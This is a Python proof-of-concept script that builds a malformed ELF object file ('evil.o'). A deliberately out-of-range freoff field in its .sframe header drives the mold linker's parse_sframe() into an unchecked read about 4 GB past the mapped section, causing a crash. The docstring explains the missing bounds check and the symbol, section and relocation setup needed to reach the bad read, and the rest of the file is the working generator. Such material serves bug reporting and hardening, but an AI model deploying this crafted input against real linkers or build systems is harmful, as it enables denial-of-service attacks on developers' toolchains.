#!/usr/bin/env python3
"""Writes a minimal x86_64 ET_REL ELF object with a ".sframe" section whose
SFrameHeader.freoff field lies about the location of the frame-row-entry
(FRE) blob.

mold's ObjectFile<E>::parse_sframe() (src/input-files.cc, ~line 775) does:

    i64 hdr_len = sizeof(SFrameHeader<E>) + hdr.auxhdr_len;
    i64 fde_off = hdr_len + hdr.fdeoff;
    i64 fre_off = hdr_len + hdr.freoff;
    ...
    for (i64 i = 0; i < num_fdes; i++) {
      i64 idx_off = fde_off + i * sizeof(SFrameFdeIdx<E>);
      const SFrameFdeIdx<E> &ent = *(const SFrameFdeIdx<E> *)(data.data() + idx_off);
      ... // match this FDE's func_start against a relocation
      i64 off = fre_off + ent.func_start_fre_off;
      ...
      fde.fre = data.substr(off, sframe_fre_block_size<E>(data, off));
      ...
    }

Neither `fde_off` nor `fre_off` (both derived from fully attacker-controlled
32-bit header fields `fdeoff`/`freoff`) is ever range-checked against the
section's real size (`data.size()`). This object sets `fdeoff = 0` (so the
one FDE index entry is real/in-bounds and the relocation-matching logic
above finds it and proceeds past the "no relocation" continue), but sets
`freoff = 0xFFFFFFF0` (~4.29 GB). This makes `off` in the snippet above a
huge value, and `sframe_fre_block_size()` (src/input-files.cc ~line 747)
immediately does:

    const u8 *attr = (const u8 *)data.data() + offset;
    i64 num_fres = *(U16<E> *)attr;   // <-- raw read ~4GB past the mmap'd file

This walks the read pointer roughly 4 GB past the small mmap'd section,
almost certainly past the very last page the kernel backs for this file
mapping -> SIGSEGV. (Per this project's own accumulated lesson: only an
offset large enough to jump entirely past the mapped region reliably
faults; a merely-one-past-the-end offset would silently read as zero.)

To reach that read at all, the object also needs:
  - a `.text` section (section index 1) for a symbol to point at,
  - a `.symtab` with one local, defined, section-typed symbol pointing at
    `.text` (so `get_section()` resolves to a real, non-null InputSection),
  - a `.rela.sframe` section with one relocation at r_offset == the FDE
    index's file offset (28, right after the 28-byte header, since
    fdeoff == 0), r_sym pointing at that symbol.
This satisfies parse_sframe()'s relocation-match check
(`rels[rel_idx].r_offset == idx_off`) so the loop body actually reads
`ent.func_start_fre_off` and computes the malicious `off`, instead of
`continue`-ing past the whole FDE untouched.
"""
import struct
import sys

SFRAME_MAGIC = 0xdee2
SFRAME_ABI_AMD64_ENDIAN_LITTLE = 3
EM_X86_64 = 62
SHT_PROGBITS = 1
SHT_SYMTAB = 2
SHT_STRTAB = 3
SHT_RELA = 4
SHF_ALLOC = 0x2
SHF_EXECINSTR = 0x4
STB_LOCAL = 0
STT_SECTION = 3


def build() -> bytes:
    e_ident = b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\x00" * 8  # ELFCLASS64, ELFDATA2LSB

    text_body = b"\x00" * 16

    sframe_hdr = struct.pack(
        "<HBBBbbBIIIII",
        SFRAME_MAGIC,   # magic
        3,              # version = 3 (only version mold supports)
        0,              # flags
        SFRAME_ABI_AMD64_ENDIAN_LITTLE,  # abi_arch
        0,              # cfa_fixed_fp_offset
        0,              # cfa_fixed_ra_offset
        0,              # auxhdr_len
        1,              # num_fdes = 1
        0,              # num_fres
        0,              # fre_len
        0,              # fdeoff = 0 (the one FDE index entry is in-bounds/real)
        0xFFFFFFF0,     # freoff = huge (~4.29 GB) -- THE BUG
    )
    assert len(sframe_hdr) == 28

    fde_idx = struct.pack(
        "<qII",
        0,      # func_start_offset (irrelevant here, relocation drives lookup)
        0x10,   # func_size
        0,      # func_start_fre_off
    )
    assert len(fde_idx) == 16

    sframe_body = sframe_hdr + fde_idx  # 44 bytes total

    strtab = b"\x00"

    shstrtab_parts = [b"", b".text", b".sframe", b".strtab", b".rela.sframe",
                       b".symtab", b".shstrtab"]
    shstrtab = b"\x00".join(shstrtab_parts) + b"\x00"

    def name_off(name: bytes) -> int:
        off = 0
        for part in shstrtab_parts:
            if part == name:
                return off
            off += len(part) + 1
        raise ValueError(name)

    off_ehdr = 0
    off_text = 64
    off_sframe = off_text + len(text_body)
    off_strtab = off_sframe + len(sframe_body)
    off_rela = off_strtab + len(strtab)
    pad_rela = (-off_rela) % 8
    off_rela += pad_rela
    off_symtab = off_rela + 24
    off_shstrtab = off_symtab + 48
    off_shdrs = off_shstrtab + len(shstrtab)
    pad_shdrs = (-off_shdrs) % 8
    off_shdrs += pad_shdrs

    # section indices
    SHN_TEXT = 1
    SHN_SFRAME = 2
    SHN_STRTAB = 3
    SHN_RELA_SFRAME = 4
    SHN_SYMTAB = 5
    SHN_SHSTRTAB = 6

    # symtab: entry0 = null symbol, entry1 = local STT_SECTION symbol -> .text
    sym_null = b"\x00" * 24
    sym_text = struct.pack(
        "<IBBHQQ",
        0,                              # st_name
        (STB_LOCAL << 4) | STT_SECTION, # st_info
        0,                              # st_other
        SHN_TEXT,                       # st_shndx
        0,                              # st_value
        0,                              # st_size
    )
    symtab = sym_null + sym_text
    assert len(symtab) == 48

    # relocation: r_offset must equal idx_off == fde_off + 0*sizeof(FdeIdx)
    #           == hdr_len(28) + fdeoff(0) == 28
    R_X86_64_NONE = 0
    rela = struct.pack(
        "<QQq",
        28,                       # r_offset -> matches the FDE index's file offset
        (1 << 32) | R_X86_64_NONE,  # r_info: sym=1, type=NONE
        0,                        # r_addend
    )
    assert len(rela) == 24

    ehdr = e_ident + struct.pack(
        "<HHIQQQIHHHHHH",
        1,          # e_type = ET_REL
        EM_X86_64,  # e_machine
        1,          # e_version
        0,          # e_entry
        0,          # e_phoff
        off_shdrs,  # e_shoff
        0,          # e_flags
        64,         # e_ehsize
        0,          # e_phentsize
        0,          # e_phnum
        64,         # e_shentsize
        7,          # e_shnum
        SHN_SHSTRTAB,  # e_shstrndx
    )
    assert len(ehdr) == 64

    def shdr(name, type_, flags, offset, size, link, info, addralign, entsize):
        return struct.pack("<IIQQQQIIQQ", name, type_, flags, 0, offset, size,
                            link, info, addralign, entsize)

    sh_null = shdr(0, 0, 0, 0, 0, 0, 0, 0, 0)
    sh_text = shdr(name_off(b".text"), SHT_PROGBITS, SHF_ALLOC | SHF_EXECINSTR,
                    off_text, len(text_body), 0, 0, 1, 0)
    sh_sframe = shdr(name_off(b".sframe"), SHT_PROGBITS, SHF_ALLOC,
                      off_sframe, len(sframe_body), 0, 0, 1, 0)
    sh_strtab = shdr(name_off(b".strtab"), SHT_STRTAB, 0,
                      off_strtab, len(strtab), 0, 0, 1, 0)
    sh_rela = shdr(name_off(b".rela.sframe"), SHT_RELA, 0,
                    off_rela, 24, SHN_SYMTAB, SHN_SFRAME, 8, 24)
    sh_symtab = shdr(name_off(b".symtab"), SHT_SYMTAB, 0,
                      off_symtab, 48, SHN_STRTAB, 2, 8, 24)
    sh_shstrtab = shdr(name_off(b".shstrtab"), SHT_STRTAB, 0,
                        off_shstrtab, len(shstrtab), 0, 0, 1, 0)

    out = bytearray()
    out += ehdr
    assert len(out) == off_text
    out += text_body
    assert len(out) == off_sframe
    out += sframe_body
    assert len(out) == off_strtab
    out += strtab
    out += b"\x00" * pad_rela
    assert len(out) == off_rela
    out += rela
    assert len(out) == off_symtab
    out += symtab
    assert len(out) == off_shstrtab
    out += shstrtab
    out += b"\x00" * pad_shdrs
    assert len(out) == off_shdrs
    out += sh_null + sh_text + sh_sframe + sh_strtab + sh_rela + sh_symtab + sh_shstrtab

    return bytes(out)


def main() -> None:
    out_path = sys.argv[1] if len(sys.argv) > 1 else "evil.o"
    with open(out_path, "wb") as f:
        f.write(build())


if __name__ == "__main__":
    main()
